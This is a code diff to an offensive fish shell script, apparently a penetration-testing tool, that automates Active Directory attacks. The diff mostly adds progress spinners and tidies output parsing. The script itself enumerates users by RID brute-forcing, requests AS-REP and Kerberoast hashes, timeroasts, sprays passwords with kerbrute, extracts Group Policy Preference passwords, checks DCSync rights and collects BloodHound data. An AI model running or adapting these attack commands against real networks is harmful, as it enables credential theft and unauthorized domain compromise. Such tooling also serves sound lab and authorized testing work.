@@ -257,7 +257,7 @@ Examples:
         # Prioritize --rid-brute over --users
         ezpz_header "Enumerating users with RID Bruteforcing"
         ezpz_cmd "nxc smb $nxc_auth --rid-brute 10000"
-        nxc smb $nxc_auth --rid-brute 10000 2>/dev/null | grep -a 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
+        ezpz_spin nxc smb $nxc_auth --rid-brute 10000 | grep -a 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
         
         if test $pipestatus[1] -eq 124
             ezpz_warn "Operation timed out. Skipping."
@@ -274,7 +274,7 @@ Examples:
                 # Fallback to --users
                 ezpz_header "Enumerating users (fallback)"
                 ezpz_cmd "nxc smb $nxc_auth --users"
-                nxc smb $nxc_auth --users 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
+                ezpz_spin nxc smb $nxc_auth --users | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
                 
                 if test $pipestatus[1] -eq 124
                     ezpz_warn "Operation timed out. Skipping."
@@ -296,22 +296,50 @@ Examples:
 
     ezpz_header "Enumerating groups"
     ezpz_cmd "nxc ldap $nxc_auth --groups"
-    set groups_out (nxc ldap $nxc_auth --groups 2>/dev/null)
+    set -l groups_tmp (mktemp)
+    ezpz_spin_capture $groups_tmp nxc ldap $nxc_auth --groups
+    set groups_out (cat $groups_tmp)
+    rm -f $groups_tmp
+
+    set -l groups_rendered
     if string match -q '*membercount*' -- $groups_out
         # Older nxc output format
-        printf '%s\n' $groups_out | grep -a 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -av 'membercount: 0' | sed "s/membercount:/-/g"
+        set groups_rendered (printf '%s\n' $groups_out | grep -a 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -av 'membercount: 0' | sed "s/membercount:/-/g")
     else
-        # nxc >= 1.5 already renders an aligned Group/Members/Description table
-        printf '%s\n' $groups_out | grep -avF -e '[*]' -e '[+]' | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//'
+        # nxc >= 1.5 renders an aligned table. Keep only Group and Members;
+        # descriptions are noisy and are intentionally discarded here.
+        set groups_rendered (printf '%s\n' $groups_out \
+            | grep -avF -e '[*]' -e '[+]' -e '[-]' -e '[!]' \
+            | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
+            | awk '
+                members_col == 0 && index($0, "-Members-") > 0 {
+                    members_col = index($0, "-Members-")
+                    desc_col = index($0, "-Description-")
+                    printf "%-40s %s\n", "GROUP", "MEMBERS"
+                    next
+                }
+                members_col > 0 {
+                    group = substr($0, 1, members_col - 1)
+                    members = substr($0, members_col, (desc_col > members_col ? desc_col - members_col : length($0)))
+                    gsub(/^[ \t]+|[ \t]+$/, "", group)
+                    gsub(/^[ \t]+|[ \t]+$/, "", members)
+                    if (group != "" && members != "0") printf "%-40s %s\n", group, members
+                }')
+    end
+
+    if test -n "$groups_rendered"
+        printf '%s\n' $groups_rendered
+    else
+        ezpz_warn "No groups returned (access denied?)."
     end
 
     ezpz_header "Enumerating privileged users"
     ezpz_cmd "nxc ldap $nxc_auth --admin-count"
-    nxc ldap $nxc_auth --admin-count 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5
+    ezpz_spin nxc ldap $nxc_auth --admin-count | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5
 
     ezpz_header "Enumerating user descriptions"
     ezpz_cmd "nxc ldap $nxc_auth -M get-desc-users"
-    nxc ldap $nxc_auth -M get-desc-users 2>/dev/null | grep -a --color=never -o "User:.*" | awk -F'description: ' '{user=$1; sub(/^User: /, "", user); print user " ||| " $2}' | column -s '|||' -t
+    ezpz_spin nxc ldap $nxc_auth -M get-desc-users | grep -a --color=never -o "User:.*" | awk -F'description: ' '{user=$1; sub(/^User: /, "", user); print user " ||| " $2}' | column -s '|||' -t
 
     ezpz_title "Looking for exploitable accounts..."
 
@@ -320,13 +348,13 @@ Examples:
     if test "$cross_domain" = true; or set -q _flag_kerb
         if test -f $users_file
             ezpz_cmd "GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file"
-            GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
+            ezpz_spin GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
         else
             ezpz_warn "Users file $users_file not found. Skipping cross-domain AS-REP roasting with usersfile."
         end
     else
         ezpz_cmd "GetNPUsers.py $imp_auth -request -outputfile $asrep_file"
-        GetNPUsers.py $imp_auth -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
+        ezpz_spin GetNPUsers.py $imp_auth -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
     end
 
     if test -s $asrep_file
@@ -340,10 +368,10 @@ Examples:
     set kerb_file "$file_domain"_kerb.hash
     if test "$cross_domain" = true
         ezpz_cmd "GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file"
-        GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
+        ezpz_spin GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
     else
         ezpz_cmd "GetUserSPNs.py $imp_auth -request -outputfile $kerb_file"
-        GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
+        ezpz_spin GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
     end
     if test -s $kerb_file
         # Convert hashes to user:hash format and save to a temporary file
@@ -359,7 +387,7 @@ Examples:
     ezpz_header "Searching for Timeroastable accounts"
     set time_file "$file_domain"_time.hash
     ezpz_cmd "smb $nxc_auth -M timeroast"
-    nxc smb $nxc_auth -M timeroast 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
+    ezpz_spin nxc smb $nxc_auth -M timeroast | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
     if test -s $time_file
         ezpz_info "Saving hashes to $time_file"
     else
@@ -368,36 +396,41 @@ Examples:
 
     ezpz_header "Searching for accounts with PASSWD_NOTREQD flag"
     ezpz_cmd "nxc ldap $nxc_auth --password-not-required"
-    nxc ldap $nxc_auth --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"
+    ezpz_spin nxc ldap $nxc_auth --password-not-required | grep --color=never -ao "User:.*"
 
     ezpz_header "Enumerating Group Managed Service Accounts (gMSA)"
     ezpz_cmd "nxc ldap $nxc_auth --gmsa"
-    timeout 60 nxc ldap $nxc_auth --gmsa 2>/dev/null | grep -aoE "Account:.*|PrincipalsAllowedToReadPassword:.*" --color=never
+    ezpz_spin timeout 60 nxc ldap $nxc_auth --gmsa | grep -aoE "Account:.*|PrincipalsAllowedToReadPassword:.*" --color=never
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
 
   
     if command -v pre2k >/dev/null 2>&1
-        ezpz_header "Searching for pre-Win2k compatible computer accounts"
-        
-        # Build pre2k auth command
-        set pre2k_cmd pre2k auth -t 100 -u "$bare_user" -d $domain -dc-ip $dc_ip
-        
-        # Add authentication method
-        if set -q _flag_password
-            set -a pre2k_cmd -p "$_flag_password"
-        else if set -q _flag_hash
-            set -a pre2k_cmd -hashes ":$_flag_hash"
-        else if set -q _flag_kerb
-            set -a pre2k_cmd -k
-            if set -q KRB5CCNAME
-                set -a pre2k_cmd -no-pass
+        if test "$cross_domain" = true
+            ezpz_warn "pre2k auth does not support cross-domain auth; skipping."
+            ezpz_info "Run pre2k against the credential domain DC (e.g. -t 10.10.0.11 -d north.sevenkingdoms.local)."
+        else
+            ezpz_header "Searching for pre-Win2k compatible computer accounts"
+
+            # Build pre2k auth command
+            set pre2k_cmd pre2k auth -threads 100 -u "$bare_user" -d $domain -dc-ip $dc_ip
+
+            # Add authentication method
+            if set -q _flag_password
+                set -a pre2k_cmd -p "$_flag_password"
+            else if set -q _flag_hash
+                set -a pre2k_cmd -hashes ":$_flag_hash"
+            else if set -q _flag_kerb
+                set -a pre2k_cmd -k
+                if set -q KRB5CCNAME
+                    set -a pre2k_cmd -no-pass
+                end
             end
+
+            ezpz_cmd "$pre2k_cmd"
+            ezpz_spin $pre2k_cmd | grep -aioE "VALID CREDENTIALS: .*" --color=never
         end
-        
-        ezpz_cmd "$pre2k_cmd"
-        $pre2k_cmd 2>/dev/null | grep -aioE "VALID CREDENTIALS: .*" --color=never
     else
         ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
     end
@@ -407,7 +440,7 @@ Examples:
         ezpz_header "Bruteforcing credentials with username as password"
         if test -s $users_tmp
             ezpz_cmd "kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass"
-            kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass | grep -aoE "VALID LOGIN.*" | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g'
+            ezpz_spin kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass | grep -aoE "VALID LOGIN.*" | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g'
         else
             ezpz_error "User list is empty. Run RID bruteforce first. Skipping."
         end
@@ -419,29 +452,32 @@ Examples:
 
     ezpz_header "Searching for PKI Enrollment Services (ADCS)"
     ezpz_cmd "nxc ldap $nxc_auth -M adcs"
-    nxc ldap $nxc_auth -M adcs 2>/dev/null | grep -a 'ADCS' | tr -s " " | cut -d ' ' -f 6-
+    ezpz_spin nxc ldap $nxc_auth -M adcs | grep -a 'ADCS' | tr -s " " | cut -d ' ' -f 6-
 
     ezpz_header "Searching for trust relationships"
     if set -q nxc_auth_ip
         ezpz_cmd "nxc ldap $nxc_auth_ip --dc-list"
-        nxc ldap $nxc_auth_ip --dc-list 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-
+        ezpz_spin nxc ldap $nxc_auth_ip --dc-list | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-
     else
         ezpz_cmd "nxc ldap $nxc_auth --dc-list"
-        nxc ldap $nxc_auth --dc-list 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-
+        ezpz_spin nxc ldap $nxc_auth --dc-list | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-
     end
 
     ezpz_header "Enumerating MachineAccountQuota (MAQ)"
     ezpz_cmd "nxc ldap $nxc_auth -M maq"
-    nxc ldap $nxc_auth -M maq 2>/dev/null | grep -aoE "MachineAccountQuota: .*" --color=never
+    ezpz_spin nxc ldap $nxc_auth -M maq | grep -aoE "MachineAccountQuota: .*" --color=never
 
     ezpz_header "Enumerating delegation rights"
+    set -l delegation_tmp (mktemp)
     if test "$cross_domain" = true
         ezpz_cmd "findDelegation.py $imp_auth -target-domain $target_domain"
-        set output (findDelegation.py $imp_auth -target-domain $target_domain 2>&1)
+        ezpz_spin_capture $delegation_tmp findDelegation.py $imp_auth -target-domain $target_domain
     else
         ezpz_cmd "findDelegation.py $imp_auth"
-        set output (findDelegation.py $imp_auth 2>&1)
+        ezpz_spin_capture $delegation_tmp findDelegation.py $imp_auth
     end
+    set output (cat $delegation_tmp)
+    rm -f $delegation_tmp
     set error_lines (printf '%s\n' $output | grep -aiE "(No entries found|Error)")
     if test -n "$error_lines"
         for line in $error_lines
@@ -464,12 +500,12 @@ Examples:
         end
     end
     ezpz_cmd "nxc ldap $nxc_auth -M daclread -o TARGET_DN=\"$target_dn\" ACTION=read RIGHTS=DCSync"
-    nxc ldap $nxc_auth -M daclread -o TARGET_DN="$target_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | grep -a "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
+    ezpz_spin nxc ldap $nxc_auth -M daclread -o TARGET_DN="$target_dn" ACTION=read RIGHTS=DCSync | grep -a "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
 
     ezpz_header "Searching for credentials in Group Policy Preferences (GPP)"
     ezpz_cmd "nxc smb $nxc_auth -M gpp_password -M gpp_autologin"
-    nxc smb $nxc_auth -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
-    nxc smb $nxc_auth -M gpp_autologin 2>/dev/null | grep -aioE "Found credentials .*|Usernames: .*|Passwords: .*" --color=never
+    ezpz_spin nxc smb $nxc_auth -M gpp_password | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
+    ezpz_spin nxc smb $nxc_auth -M gpp_autologin | grep -aioE "Found credentials .*|Usernames: .*|Passwords: .*" --color=never
 
     ezpz_title "DNS enumeration..."
 
@@ -477,7 +513,7 @@ Examples:
     if command -v bloodyAD >/dev/null 2>&1
         ezpz_header "Enumerating DNS records"
         ezpz_cmd "bloodyAD $bloody_auth get dnsDump"
-        timeout 60 bloodyAD $bloody_auth get dnsDump 2>/dev/null | awk '
+        ezpz_spin timeout 60 bloodyAD $bloody_auth get dnsDump | awk '
         {
             if (/^recordName:/) {
                 current_record = $2
@@ -511,7 +547,7 @@ Examples:
     ezpz_header "Ingesting AD data for BloodHound"
     set bh_tmp (mktemp)
     ezpz_cmd "nxc ldap $nxc_auth --bloodhound --collection All --dns-server $dc_ip"
-    nxc ldap $nxc_auth --bloodhound --collection All --dns-server $dc_ip > $bh_tmp 2>&1
+    ezpz_spin_capture $bh_tmp nxc ldap $nxc_auth --bloodhound --collection All --dns-server $dc_ip
     set bh_status $status
     # nxc can emit NUL bytes from LDAP errors. Strip them and show the tail so
     # collection failures are visible instead of silently swallowed.
